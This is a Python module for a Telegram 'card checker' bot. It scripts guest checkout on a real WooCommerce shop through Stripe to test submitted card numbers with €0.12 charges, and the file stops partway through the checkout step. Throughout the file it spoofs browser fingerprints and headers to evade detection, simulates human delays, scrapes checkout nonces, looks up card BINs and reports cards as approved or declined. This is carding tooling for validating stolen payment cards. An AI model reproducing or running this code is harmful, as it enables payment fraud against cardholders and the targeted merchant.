# BOT/gates/charge/stripe/scharge012.py
# Stripe Charge €0.12 - Compatible with WAYNE Bot Structure
# UI format matches stauth.py with proper permissions
# CORRECTED: Uses universal charge processor - credits deducted AFTER check completes
# FIXED FOR UBUNTU VPS: Added DNS resolution fix, better error handling, and proxy support

import json
import asyncio
import re
import time
import httpx
import random
import string
import ssl
import certifi
import socket
from datetime import datetime
from pyrogram import Client, filters
from pyrogram.types import Message
import html
import os
import sys
from BOT.helper.permissions import auth_and_free_restricted
from BOT.helper.start import load_users, save_users

# Import from Admins module for command status
try:
    from BOT.helper.Admins import is_command_disabled, get_command_offline_message
except ImportError:
    def is_command_disabled(command_name: str) -> bool:
        return False

    def get_command_offline_message(command_name: str) -> str:
        return "Command is temporarily disabled."

# Import universal charge processor
try:
    from BOT.gc.credit import charge_processor
except ImportError:
    charge_processor = None

# Custom logger with emoji formatting
class EmojiLogger:
    def __init__(self):
        pass

    def info(self, message):
        print(f"🔹 {message}", flush=True)

    def success(self, message):
        print(f"✅ {message}", flush=True)

    def warning(self, message):
        print(f"⚠️ {message}", flush=True)

    def error(self, message):
        print(f"❌ {message}", flush=True)

    def step(self, step_num, total_steps, message):
        print(f"🔸 [{step_num}/{total_steps}] {message}", flush=True)

    def network(self, message):
        print(f"🌐 {message}", flush=True)

    def card(self, message):
        print(f"💳 {message}", flush=True)

    def stripe(self, message):
        print(f"🔄 {message}", flush=True)

    def debug_response(self, message):
        print(f"🔧 {message}", flush=True)

    def bin_info(self, message):
        print(f"🏦 {message}", flush=True)

    def user(self, message):
        print(f"👤 {message}", flush=True)

# Create global logger instance
logger = EmojiLogger()

def load_owner_id():
    try:
        with open("FILES/config.json", "r") as f:
            config_data = json.load(f)
            return config_data.get("OWNER")
    except Exception as e:
        logger.error(f"Failed to load owner ID: {e}")
        return None

def get_user_plan(user_id):
    users = load_users()
    user_id_str = str(user_id)
    if user_id_str in users:
        return users[user_id_str].get("plan", {})
    return {}

def is_user_banned(user_id):
    try:
        if not os.path.exists("DATA/banned_users.txt"):
            return False

        with open("DATA/banned_users.txt", "r") as f:
            banned_users = f.read().splitlines()

        return str(user_id) in banned_users
    except Exception as e:
        logger.error(f"Failed to check banned users: {e}")
        return False

def check_cooldown(user_id, command_type="xx"):
    """Check cooldown for user - SKIP FOR OWNER"""
    # Get owner ID
    owner_id = load_owner_id()

    # Skip cooldown check for owner
    if str(user_id) == str(owner_id):
        return True, 0

    try:
        with open("DATA/cooldowns.json", "r") as f:
            cooldowns = json.load(f)
    except Exception as e:
        logger.warning(f"Failed to load cooldowns: {e}")
        cooldowns = {}

    user_key = f"{user_id}_{command_type}"
    current_time = time.time()

    if user_key in cooldowns:
        last_time = cooldowns[user_key]
        user_plan = get_user_plan(user_id)
        antispam = user_plan.get("antispam", 15)

        if antispam is None:
            antispam = 15

        if current_time - last_time < antispam:
            return False, antispam - (current_time - last_time)

    cooldowns[user_key] = current_time
    try:
        with open("DATA/cooldowns.json", "w") as f:
            json.dump(cooldowns, f, indent=4)
    except Exception as e:
        logger.error(f"Failed to save cooldowns: {e}")

    return True, 0

class StripeCharge012Checker:
    def __init__(self):
        # Modern browser user agents
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPad; CPU OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36"
        ]
        self.user_agent = random.choice(self.user_agents)
        self.bin_cache = {}
        self.last_bin_request = 0
        self.base_url = "https://bellobrick.com"
        self.stripe_key = "pk_live_51Gv2pCHrGjSxgNAlJ8eLnmjPrToBlChZFRgIpvGduYeqg66FzEJaQtLb4h2FOz193UH5RSoj6nUptqB5L7BRc9NR00VKfvfrsc"

        self.bin_services = [
            {
                'url': 'https://lookup.binlist.net/{bin}',
                'headers': {'Accept-Version': '3', 'User-Agent': self.user_agent},
                'name': 'binlist.net',
                'parser': self.parse_binlist_net
            },
            {
                'url': 'https://bins.antipublic.cc/bins/{bin}',
                'headers': {'User-Agent': self.user_agent},
                'name': 'antipublic.cc',
                'parser': self.parse_antipublic
            }
        ]

        # Unsupported card errors
        self.unsupported_card_errors = [
            "authentication is not available for this type of card",
            "this card does not support authentication",
            "card not supported",
            "this card type is not accepted",
            "card type not supported",
            "unsupported card type",
            "issuer not available",
            "card issuer declined",
            "contact your card issuer",
            "card_declined",
            "incorrect_cvc",
            "expired_card",
            "processing_error",
            "incorrect_number",
            "your card was declined",
            "card has been declined",
            "declined",
            "unsuccessful",
            "failed",
            "not approved",
            "suspected fraud",
            "fraudulent",
            "security violation",
            "suspicious activity",
            "insufficient funds",
            "exceeds withdrawal limit",
            "exceeds credit limit",
            "daily limit exceeded",
            "invalid account",
            "account restricted",
            "account closed",
            "lost card",
            "stolen card",
            "session has expired",
            "amount must be at least €0.50 eur"
        ]

        # Generate random browser fingerprints
        self.generate_browser_fingerprint()
        
        # SSL context for Ubuntu VPS compatibility - UPDATED WITH DNS RESOLUTION
        try:
            # Force IPv4 to avoid IPv6 issues on some VPS
            socket.setdefaulttimeout(10)
            
            # Create SSL context with system certificates
            self.ssl_context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
            self.ssl_context.check_hostname = True
            self.ssl_context.verify_mode = ssl.CERT_REQUIRED
            
            # Try to load system certificates first
            try:
                import ssl
                self.ssl_context.load_default_certs()
            except:
                logger.warning("Could not load system certs, using certifi")
                import certifi
                self.ssl_context.load_verify_locations(cafile=certifi.where())
                
        except Exception as e:
            logger.warning(f"SSL context creation failed: {e}, using default")
            self.ssl_context = None
            
        # DNS resolution test
        self.test_dns_resolution()

    def test_dns_resolution(self):
        """Test DNS resolution for critical domains"""
        domains_to_test = ["bellobrick.com", "bins.antipublic.cc", "lookup.binlist.net"]
        for domain in domains_to_test:
            try:
                # Force IPv4
                socket.getaddrinfo(domain, 443, socket.AF_INET)
                logger.success(f"DNS resolution OK for {domain}")
            except socket.gaierror as e:
                logger.error(f"DNS resolution FAILED for {domain}: {e}")
                # Try IPv4 explicitly
                try:
                    socket.getaddrinfo(domain, 443, socket.AF_INET)
                    logger.success(f"IPv4 DNS resolution OK for {domain}")
                except:
                    logger.error(f"IPv4 DNS also failed for {domain}")

    def generate_browser_fingerprint(self):
        """Generate realistic browser fingerprints to bypass detection"""
        self.screen_resolutions = [
            "1920x1080", "1366x768", "1536x864", "1440x900", 
            "1280x720", "1600x900", "2560x1440", "3840x2160"
        ]

        self.timezones = [
            "America/New_York", "America/Chicago", "America/Denver", 
            "America/Los_Angeles", "Europe/London", "Europe/Paris",
            "Asia/Tokyo", "Australia/Sydney"
        ]

        self.languages = [
            "en-US,en;q=0.9", "en-GB,en;q=0.8", "en-CA,en;q=0.9,fr;q=0.8",
            "en-AU,en;q=0.9", "de-DE,de;q=0.9,en;q=0.8", "fr-FR,fr;q=0.9,en;q=0.8"
        ]

        if "Windows" in self.user_agent:
            self.platform = "Win32"
            self.sec_ch_ua_platform = '"Windows"'
        elif "Macintosh" in self.user_agent:
            self.platform = "MacIntel"
            self.sec_ch_ua_platform = '"macOS"'
        elif "Linux" in self.user_agent:
            self.platform = "Linux x86_64"
            self.sec_ch_ua_platform = '"Linux"'
        elif "iPhone" in self.user_agent or "iPad" in self.user_agent:
            self.platform = "iPhone"
            self.sec_ch_ua_platform = '"iOS"'
        elif "Android" in self.user_agent:
            self.platform = "Linux armv8l"
            self.sec_ch_ua_platform = '"Android"'
        else:
            self.platform = "Win32"
            self.sec_ch_ua_platform = '"Windows"'

        self.screen_resolution = random.choice(self.screen_resolutions)
        self.timezone = random.choice(self.timezones)
        self.accept_language = random.choice(self.languages)
        self.connection_type = random.choice(["keep-alive", "close"])

        chrome_version = re.search(r'Chrome/(\d+)', self.user_agent)
        if chrome_version:
            version = chrome_version.group(1)
            self.sec_ch_ua = f'"Not A;Brand";v="99", "Chromium";v="{version}", "Google Chrome";v="{version}"'
        else:
            self.sec_ch_ua = '"Not A;Brand";v="99", "Chromium";v="144", "Google Chrome";v="144"'

        self.sec_ch_ua_mobile = "?0" if "Mobile" not in self.user_agent else "?1"

    def get_country_emoji(self, country_code):
        """Hardcoded country emoji mapping"""
        country_emojis = {
            'US': '🇺🇸', 'GB': '🇬🇧', 'CA': '🇨🇦', 'AU': '🇦🇺', 'DE': '🇩🇪',
            'FR': '🇫🇷', 'IT': '🇮🇹', 'ES': '🇪🇸', 'JP': '🇯🇵', 'CN': '🇨🇳',
            'IN': '🇮🇳', 'BR': '🇧🇷', 'MX': '🇲🇽', 'RU': '🇷🇺', 'KR': '🇰🇷',
            'NL': '🇳🇱', 'CH': '🇨🇭', 'SE': '🇸🇪', 'NO': '🇳🇴', 'DK': '🇩🇰',
            'FI': '🇫🇮', 'PL': '🇵🇱', 'TR': '🇹🇷', 'AE': '🇦🇪', 'SA': '🇸🇦',
            'SG': '🇸🇬', 'MY': '🇲🇾', 'TH': '🇹🇭', 'ID': '🇮🇩', 'PH': '🇵🇭',
            'VN': '🇻🇳', 'BD': '🇧🇩', 'PK': '🇵🇰', 'NG': '🇳🇬', 'ZA': '🇿🇦',
            'BE': '🇧🇪', 'AT': '🇦🇹', 'PT': '🇵🇹', 'IE': '🇮🇪', 'NZ': '🇳🇿',
            'EG': '🇪🇬', 'MA': '🇲🇦'
        }
        return country_emojis.get(country_code.upper() if country_code else 'N/A', '🏳️')

    def get_base_headers(self):
        """Get undetectable base headers"""
        return {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': self.accept_language,
            'Cache-Control': 'max-age=0',
            'Connection': self.connection_type,
            'DNT': '1',
            'Sec-CH-UA': self.sec_ch_ua,
            'Sec-CH-UA-Mobile': self.sec_ch_ua_mobile,
            'Sec-CH-UA-Platform': self.sec_ch_ua_platform,
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': self.user_agent,
            'Viewport-Width': self.screen_resolution.split('x')[0],
            'Width': self.screen_resolution.split('x')[0]
        }

    def parse_binlist_net(self, data):
        scheme = data.get('scheme', 'N/A').upper()
        if scheme == 'N/A':
            scheme = data.get('brand', 'N/A').upper()

        card_type = data.get('type', 'N/A').upper()
        brand = data.get('brand', 'N/A')
        bank_name = data.get('bank', {}).get('name', 'N/A').upper()
        country_name = data.get('country', {}).get('name', 'N/A')
        country_code = data.get('country', {}).get('alpha2', 'N/A')

        if country_name:
            country_name = country_name.replace('(the)', '').strip().upper()

        brand_display = brand.upper() if brand != 'N/A' else 'N/A'
        flag_emoji = self.get_country_emoji(country_code)

        return {
            'scheme': scheme,
            'type': card_type,
            'brand': brand_display,
            'bank': bank_name,
            'country': country_name,
            'country_code': country_code,
            'emoji': flag_emoji
        }

    def parse_antipublic(self, data):
        if isinstance(data, str):
            try:
                data = json.loads(data)
            except json.JSONDecodeError:
                return {
                    'scheme': 'N/A',
                    'type': 'N/A',
                    'brand': 'N/A',
                    'bank': 'N/A',
                    'country': 'N/A',
                    'country_code': 'N/A',
                    'emoji': '🏳️'
                }

        country_code = data.get('country', 'N/A')
        country_name = data.get('country_name', country_code)
        flag_emoji = data.get('country_flag', '🏳️')

        if country_name:
            country_name = country_name.replace('(the)', '').strip().upper()

        if flag_emoji == '🏳️' or flag_emoji == 'N/A':
            if country_code != 'N/A' and len(country_code) == 2:
                flag_emoji = self.get_country_emoji(country_code)

        return {
            'scheme': data.get('brand', 'N/A').upper(),
            'type': data.get('type', 'N/A').upper(),
            'brand': data.get('brand', 'N/A').upper(),
            'bank': data.get('bank', 'N/A').upper(),
            'country': country_name,
            'country_code': country_code,
            'emoji': flag_emoji
        }

    async def get_bin_info(self, cc):
        """Get BIN information with proper flag handling"""
        if not cc or len(cc) < 6:
            return {
                'scheme': 'N/A',
                'type': 'N/A',
                'brand': 'N/A',
                'bank': 'N/A',
                'country': 'N/A',
                'country_code': 'N/A',
                'emoji': '🏳️'
            }

        bin_number = cc[:6]

        if bin_number in self.bin_cache:
            return self.bin_cache[bin_number]

        now = time.time()
        if now - self.last_bin_request < 1.0:
            await asyncio.sleep(1.0)
        self.last_bin_request = time.time()

        default_response = {
            'scheme': 'N/A',
            'type': 'N/A',
            'brand': 'N/A',
            'bank': 'N/A',
            'country': 'N/A',
            'country_code': 'N/A',
            'emoji': '🏳️'
        }

        # Try with retry logic for Ubuntu VPS
        for attempt in range(3):
            try:
                url = f"https://bins.antipublic.cc/bins/{bin_number}"
                headers = {'User-Agent': self.user_agent}

                async with httpx.AsyncClient(
                    timeout=20.0,
                    verify=self.ssl_context if self.ssl_context else True,
                    follow_redirects=True,
                    limits=httpx.Limits(max_keepalive_connections=2, max_connections=5)
                ) as client:
                    response = await client.get(url, headers=headers)

                    if response.status_code == 200:
                        data = response.json()
                        if "detail" in data and "not found" in data["detail"].lower():
                            logger.warning(f"BIN {bin_number} not found in antipublic.cc")
                        else:
                            result = self.parse_antipublic(data)
                            self.bin_cache[bin_number] = result
                            return result
                    else:
                        logger.warning(f"Attempt {attempt+1}: antipublic.cc returned {response.status_code}")
                        
            except (ssl.SSLError, socket.gaierror, socket.timeout) as e:
                logger.error(f"Network error attempt {attempt+1}: {e}")
                if attempt < 2:
                    await asyncio.sleep(3)
                    continue
            except Exception as e:
                logger.warning(f"antipublic.cc attempt {attempt+1} failed: {e}")
                if attempt < 2:
                    await asyncio.sleep(2)
                    continue

        # Fallback to binlist.net
        for service in self.bin_services:
            if service['name'] == 'binlist.net':
                for attempt in range(2):
                    try:
                        url = service['url'].format(bin=bin_number)
                        headers = service['headers']

                        async with httpx.AsyncClient(
                            timeout=15.0,
                            verify=self.ssl_context if self.ssl_context else True
                        ) as client:
                            response = await client.get(url, headers=headers)

                            if response.status_code == 200:
                                data = response.json()
                                result = service['parser'](data)

                                if result['emoji'] == '🏳️' and result['country_code'] != 'N/A':
                                    result['emoji'] = self.get_country_emoji(result['country_code'])

                                self.bin_cache[bin_number] = result
                                return result
                    except Exception as e:
                        logger.warning(f"binlist.net attempt {attempt+1} failed: {e}")
                        if attempt < 1:
                            await asyncio.sleep(2)
                            continue

        self.bin_cache[bin_number] = default_response
        return default_response

    def clean_error_message(self, message):
        """Clean error message by removing redundant prefixes"""
        if not message:
            return message

        message = re.sub(r'<[^>]+>', '', message).strip()

        declined_pattern = r'Payment Failed\s*\(\s*(Your card was declined\.?)\s*\)\.?\s*Refresh and try again'
        declined_match = re.search(declined_pattern, message, re.IGNORECASE)
        if declined_match:
            return declined_match.group(1)

        if "amount must be at least €0.50 eur" in message.lower():
            return "Your card was Declined"

        prefixes_to_remove = [
            "there was an error processing the payment: ",
            "payment error: ",
            "error: ",
            "sorry, ",
            "we're sorry, ",
            "there was a problem: ",
            "payment failed: ",
            "transaction failed: ",
            "payment failed",
            "failed: ",
        ]

        cleaned_message = message.strip()
        for prefix in prefixes_to_remove:
            if cleaned_message.lower().startswith(prefix.lower()):
                cleaned_message = cleaned_message[len(prefix):].strip()
                break

        cleaned_message = re.sub(r'\.?\s*Refresh and try again\.?$', '', cleaned_message, flags=re.IGNORECASE)
        cleaned_message = re.sub(r'\.\s*$', '', cleaned_message)

        if cleaned_message:
            cleaned_message = cleaned_message[0].upper() + cleaned_message[1:]

        return cleaned_message

    def is_unsupported_card_error(self, message):
        """Check if the error message indicates an unsupported card"""
        if not message:
            return False

        message_lower = message.lower().strip()

        for error_pattern in self.unsupported_card_errors:
            if error_pattern.lower() in message_lower:
                logger.warning(f"Unsupported card error detected: {message}")
                return True

        return False

    async def format_response(self, cc, mes, ano, cvv, status, message, username, elapsed_time, user_data, bin_info=None):
        if bin_info is None:
            bin_info = await self.get_bin_info(cc)

        user_id = user_data.get("user_id", "Unknown")
        first_name = html.escape(user_data.get("first_name", "User"))
        badge = user_data.get("plan", {}).get("badge", "🧿")

        cleaned_message = self.clean_error_message(message)

        if "3D SECURE❎" in cleaned_message:
            status_emoji = "❌"
            status_text = "DECLINED"
            message_display = "3D SECURE❎"
        elif status == "APPROVED":
            status_emoji = "✅"
            status_text = "APPROVED"
            message_display = "Successfully Charged €0.12"
        else:
            status_emoji = "❌"
            status_text = "DECLINED"
            message_display = cleaned_message or "Declined"

        clean_name = re.sub(r'[↯⌁«~∞🍁]', '', first_name).strip()
        user_display = f"「{badge}」{clean_name}"
        bank_info = bin_info['bank'].upper() if bin_info['bank'] != 'N/A' else 'N/A'

        response = f"""<b>「$cmd → /xx」| <b>WAYNE</b> </b>
━━━━━━━━━━━━━━━
<b>[•] Card-</b> <code>{cc}|{mes}|{ano}|{cvv}</code>
<b>[•] Gateway -</b> Stripe Charge €0.12
<b>[•] Status-</b> <code>{status_text} {status_emoji}</code>
<b>[•] Response-</b> <code>{message_display}</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Bin:</b> <code>{cc[:6]}</code>  
<b>[+] Info:</b> <code>{bin_info['scheme']} - {bin_info['type']} - {bin_info['brand']}</code>
<b>[+] Bank:</b> <code>{bank_info}</code> 🏦
<b>[+] Country:</b> <code>{bin_info['country']}</code> [{bin_info['emoji']}]
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[ﾒ] Checked By:</b> {user_display}
<b>[ϟ] Dev ➺</b> <b><i>DADYY</i></b>
━━━━━━━━━━━━━━━
<b>[ﾒ] T/t:</b> <code>{elapsed_time:.2f} 𝐬</code> |<b>P/x:</b> <code>Live ⚡️</code></b>"""

        return response

    def get_processing_message(self, cc, mes, ano, cvv, username, user_plan):
        return f"""<b>「$cmd → /xx」| <b>WAYNE</b> </b>
━━━━━━━━━━━━━━━
<b>[•] Card-</b> <code>{cc}|{mes}|{ano}|{cvv}</code>
<b>[•] Gateway -</b> Stripe Charge €0.12
<b>[•] Status-</b> Processing... ⏳
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Plan:</b> {user_plan}
<b>[+] User:</b> @{username}
━━━━━━━━━━━━━━━
<b>Checking card... Please wait.</b>"""

    async def human_delay(self, min_delay=1, max_delay=3):
        """Simulate human delay between actions"""
        delay = random.uniform(min_delay, max_delay)
        await asyncio.sleep(delay)

    async def make_stealth_request(self, client, method, url, **kwargs):
        """Make stealth request that mimics human behavior - FIXED FOR VPS"""
        await self.human_delay(0.5, 2.0)

        headers = kwargs.get('headers', {}).copy()
        headers.update({
            'User-Agent': self.user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate', 
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1'
        })
        kwargs['headers'] = headers
        
        # Add timeout for VPS compatibility
        if 'timeout' not in kwargs:
            kwargs['timeout'] = 45.0

        max_retries = 3
        for attempt in range(max_retries):
            try:
                # Add connection timeout specifically for VPS
                kwargs['timeout'] = httpx.Timeout(connect=15.0, read=30.0, write=10.0, pool=10.0)
                
                response = await client.request(method, url, **kwargs)

                if response.status_code in [403, 429, 500, 502, 503, 504]:
                    logger.warning(f"Got {response.status_code}, retrying {attempt+1}/{max_retries}...")
                    if attempt < max_retries - 1:
                        await asyncio.sleep(2 ** attempt)  # Exponential backoff
                        headers['User-Agent'] = random.choice(self.user_agents)
                        kwargs['headers'] = headers
                        continue

                return response
            except (httpx.ConnectError, httpx.TimeoutException, ssl.SSLError, socket.gaierror, socket.timeout) as e:
                logger.error(f"Network error attempt {attempt+1}/{max_retries}: {type(e).__name__} - {str(e)[:100]}")
                if attempt < max_retries - 1:
                    await asyncio.sleep(2 ** attempt)
                    # Try with IPv4 explicitly on last attempt
                    if attempt == max_retries - 2:
                        # Modify URL to force IPv4 if possible
                        if url.startswith('https://'):
                            domain = url.split('://')[1].split('/')[0]
                            try:
                                # Get IPv4 address
                                ipv4 = socket.gethostbyname(domain)
                                new_url = url.replace(f"https://{domain}", f"https://{ipv4}")
                                headers['Host'] = domain  # Keep original host header
                                kwargs['headers'] = headers
                                url = new_url
                                logger.warning(f"Trying IPv4 address: {ipv4} for {domain}")
                            except:
                                pass
                    continue
                raise e
            except Exception as e:
                logger.error(f"Request error: {str(e)}")
                if attempt < max_retries - 1:
                    await asyncio.sleep(2 ** attempt)
                    continue
                raise e

    async def initialize_session(self, client):
        """Initialize session with proper cookies - FIXED FOR VPS"""
        try:
            logger.step(1, 8, "Initializing session...")
            logger.network(f"Connecting to {self.base_url}")

            for attempt in range(3):
                try:
                    # First test DNS resolution
                    domain = self.base_url.split('://')[1].split('/')[0]
                    try:
                        socket.gethostbyname(domain)
                        logger.success(f"DNS resolved for {domain}")
                    except socket.gaierror as e:
                        logger.error(f"DNS resolution failed for {domain}: {e}")
                        if attempt < 2:
                            await asyncio.sleep(3)
                            continue

                    response = await self.make_stealth_request(
                        client, 'GET', f"{self.base_url}/"
                    )

                    if response.status_code == 200:
                        logger.success("Session initialized successfully")
                        return True
                    else:
                        logger.warning(f"Attempt {attempt+1}: Failed with status {response.status_code}")
                        if attempt < 2:
                            await asyncio.sleep(3)
                            continue
                except (httpx.ConnectError, ssl.SSLError, socket.gaierror, socket.timeout) as e:
                    logger.error(f"Attempt {attempt+1}: Connection error ({type(e).__name__}): {str(e)[:100]}")
                    if attempt < 2:
                        await asyncio.sleep(4)
                        continue
                    raise
                except Exception as e:
                    logger.error(f"Attempt {attempt+1}: Unexpected error: {str(e)}")
                    if attempt < 2:
                        await asyncio.sleep(3)
                        continue
                    raise

            logger.error("All session initialization attempts failed")
            return False

        except Exception as e:
            logger.error(f"Session initialization error: {str(e)}")
            return False

    async def bypass_registration(self, client, user_info):
        """Bypass registration by directly proceeding as guest"""
        try:
            logger.step(2, 8, "Bypassing registration (proceeding as guest)...")

            response = await self.make_stealth_request(
                client, 'GET', f"{self.base_url}/shop/"
            )

            if response.status_code in [200, 202]:
                logger.success("Successfully accessed shop as guest")
                return True, None
            else:
                return False, f"Failed to access shop: {response.status_code}"

        except Exception as e:
            logger.error(f"Bypass registration error: {str(e)}")
            return False, f"Bypass registration error: {str(e)}"

    async def browse_shop(self, client):
        """Browse shop to simulate natural behavior"""
        try:
            logger.step(3, 8, "Browsing shop...")

            response = await self.make_stealth_request(
                client, 'GET', f"{self.base_url}/shop/"
            )

            if response.status_code in [200, 202]:
                logger.success("Shop browsed successfully")
                return True, None
            else:
                return False, f"Shop browsing failed: {response.status_code}"

        except Exception as e:
            return False, f"Shop browsing error: {str(e)}"

    async def add_product_to_cart(self, client):
        """Add product to cart with proper variation selection"""
        try:
            logger.step(4, 8, "Adding product to cart...")

            product_url = f"{self.base_url}/product/3-2-shaft-w-3-2-hole-23443/"
            response = await self.make_stealth_request(
                client, 'GET', product_url
            )

            if response.status_code not in [200, 202]:
                return False, f"Failed to load product page: {response.status_code}"

            variation_id = "43020"
            product_id = "32989"

            product_data = {
                'attribute_pa_color': 'black',
                'attribute_pa_pack-size': 'one',
                'attribute_pa_condition': 'used',
                'quantity': '1',
                'add-to-cart': product_id,
                'product_id': product_id,
                'variation_id': variation_id
            }

            add_headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": self.base_url,
                "Referer": product_url,
            }

            response = await self.make_stealth_request(
                client, 'POST', product_url, 
                headers=add_headers, data=product_data
            )

            if response.status_code in [200, 202]:
                if 'woocommerce_items_in_cart' in str(response.cookies) or 'cart' in response.text.lower():
                    logger.success("Product added to cart successfully")
                    return True, None
                else:
                    logger.warning("Trying alternative add to cart method...")
                    ajax_data = {
                        'product_id': product_id,
                        'quantity': '1'
                    }

                    ajax_headers = {
                        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                        "X-Requested-With": "XMLHttpRequest",
                        "Referer": product_url,
                    }

                    ajax_response = await self.make_stealth_request(
                        client, 'POST', f"{self.base_url}/?wc-ajax=add_to_cart",
                        headers=ajax_headers, data=ajax_data
                    )

                    if ajax_response.status_code in [200, 202]:
                        logger.success("Product added via AJAX")
                        return True, None
                    else:
                        return False, "Product not added to cart"
            else:
                return False, f"Add to cart failed: {response.status_code}"

        except Exception as e:
            logger.error(f"Add to cart error: {str(e)}")
            return False, f"Add to cart error: {str(e)}"

    async def setup_shipping(self, client):
        """Setup shipping with proper Belgium address"""
        try:
            logger.step(5, 8, "Setting up shipping...")

            response = await self.make_stealth_request(
                client, 'GET', f"{self.base_url}/cart/"
            )

            if response.status_code not in [200, 202]:
                return None, f"Failed to load cart: {response.status_code}"

            if "your cart is currently empty" in response.text.lower():
                return None, "Cart is empty"

            shipping_nonce = None
            nonce_patterns = [
                r'name="woocommerce-shipping-calculator-nonce" value="([^"]+)"',
                r'woocommerce-shipping-calculator-nonce["\']?\s*:\s*["\']?([a-f0-9]+)',
            ]

            for pattern in nonce_patterns:
                match = re.search(pattern, response.text)
                if match:
                    shipping_nonce = match.group(1)
                    logger.success(f"Found shipping nonce: {shipping_nonce}")
                    break

            if not shipping_nonce:
                logger.warning("No shipping nonce found, using default")
                shipping_nonce = "bbc702fcfb"

            shipping_data = {
                'calc_shipping_country': 'BE',
                'calc_shipping_state': '',
                'calc_shipping_city': 'Brussels',
                'calc_shipping_postcode': '2000',
                'woocommerce-shipping-calculator-nonce': shipping_nonce,
                '_wp_http_referer': '/cart/',
                'calc_shipping': 'x'
            }

            shipping_headers = {
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Origin": self.base_url,
                "Referer": f"{self.base_url}/cart/",
                "X-Requested-With": "XMLHttpRequest",
                "Accept": "text/html, */*; q=0.01"
            }

            response = await self.make_stealth_request(
                client, 'POST', f"{self.base_url}/cart/", 
                headers=shipping_headers, data=shipping_data
            )

            if response.status_code not in [200, 202]:
                return None, f"Shipping setup failed: {response.status_code}"

            logger.success("Shipping address set to Belgium")

            await self.human_delay(1, 2)

            fragments_data = {
                'wc-ajax': 'get_refreshed_fragments',
                'time': str(int(time.time() * 1000))
            }

            fragments_headers = {
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Origin": self.base_url,
                "Referer": f"{self.base_url}/cart/",
                "X-Requested-With": "XMLHttpRequest",
                "Accept": "*/*"
            }

            response = await self.make_stealth_request(
                client, 'POST', f"{self.base_url}/?wc-ajax=get_refreshed_fragments",
                headers=fragments_headers, data=fragments_data
            )

            shipping_method_data = {
                'wc-ajax': 'update_shipping_method',
                'security': '552fd5cbde',
                'shipping_method[0]': 'local_pickup:11'
            }

            method_headers = {
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Origin": self.base_url,
                "Referer": f"{self.base_url}/cart/",
                "X-Requested-With": "XMLHttpRequest",
                "Accept": "text/html, */*; q=0.01"
            }

            response = await self.make_stealth_request(
                client, 'POST', f"{self.base_url}/?wc-ajax=update_shipping_method",
                headers=method_headers, data=shipping_method_data
            )

            if response.status_code in [200, 202]:
                logger.success("Local pickup shipping method selected")

            logger.step(6, 8, "Proceeding to checkout...")
            response = await self.make_stealth_request(
                client, 'GET', f"{self.base_url}/checkout/"
            )

            if response.status_code not in [200, 202]:
                return None, f"Checkout failed: {response.status_code}"

            if "your cart is currently empty" in response.text.lower():
                return None, "Cart empty at checkout"

            checkout_nonce = None
            checkout_nonce_match = re.search(r'name="woocommerce-process-checkout-nonce" value="([^"]+)"', response.text)
            if checkout_nonce_match:
                checkout_nonce = checkout_nonce_match.group(1)
                logger.success(f"Found checkout nonce: {checkout_nonce}")

            if not checkout_nonce:
                checkout_nonce_match = re.search(r'checkout_nonce["\']?\s*:\s*["\']([^"\']+)["\']', response.text)
                if checkout_nonce_match:
                    checkout_nonce = checkout_nonce_match.group(1)
                    logger.success(f"Found checkout nonce (alt): {checkout_nonce}")

            if not checkout_nonce:
                return None, "No checkout nonce found"

            security_nonce = "da028b30a1"
            security_match = re.search(r'update_order_review_nonce["\']?\s*:\s*["\']([^"\']+)["\']', response.text, re.IGNORECASE)
            if security_match:
                security_nonce = security_match.group(1)
                logger.success(f"Found security nonce: {security_nonce}")

            return {
                'checkout_nonce': checkout_nonce,
                'security_nonce': security_nonce
            }, None

